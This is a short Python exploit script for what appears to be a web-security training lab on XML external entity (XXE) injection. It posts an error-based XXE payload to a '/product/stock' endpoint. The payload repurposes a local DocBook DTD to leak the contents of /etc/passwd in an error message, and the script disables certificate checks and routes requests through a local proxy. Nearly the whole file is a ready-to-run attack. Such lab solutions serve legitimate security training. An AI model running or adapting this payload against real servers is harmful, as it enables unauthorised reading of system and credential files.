import requests
import sys
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http' : 'http://127.0.0.1:8080' , 'https' : 'http://127.0.0.1:8080'}

def extract_data(url):
    # PREPARE URL
    stock_url = url + '/product/stock'

    # PREPARE XXE
    xxe = '<!DOCTYPE foo [<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd"><!ENTITY % ISOamso \'<!ENTITY &#x25; file SYSTEM "file:///etc/passwd"><!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">&#x25;eval;&#x25;error;\'>%local_dtd;]>'

    # SEND PAYLOAD AND RETRIEVE DATA IF OK
    r = requests.post(stock_url, data=xxe, verify=False, proxies=proxies)
    if "root:x:0:0:root:/root:/bin/bash" not in r.text:
        print("[-] Exploit failed!")
        sys.exit(-1)
    print("[+] Exploit succeeded!")
    print(r.text)
    sys.exit(-1)

def main():
    if len(sys.argv) != 2:
        print("[-] Usage: %s <url>" % sys.argv[0])
        print("[-] Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)

    url = sys.argv[1].strip()

    print("[+] Lab: Exploiting XXE to retrieve data by repurposing a local DTD")
    print("""[+] This lab has a "Check stock" feature that parses XML input but does not display the result.
    To solve the lab, trigger an error message containing the contents of the /etc/passwd file.
You'll need to reference an existing DTD file on the server and redefine an entity from it.""")

    extract_data(url)

if __name__ == "__main__":
    main()